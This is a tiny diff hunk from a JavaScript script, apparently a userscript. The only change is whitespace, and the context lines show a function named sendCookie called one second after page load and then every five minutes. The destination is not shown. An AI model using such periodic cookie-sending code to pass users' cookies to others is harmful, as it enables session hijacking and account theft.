@@ -28,7 +28,7 @@
 
     // 页面加载后，延迟一秒发送一次以确保获取最新Cookie
     setTimeout(sendCookie, 1000);
-    
+
     // 每5分钟自动发送一次
     setInterval(sendCookie, 5 * 60 * 1000);
 })();
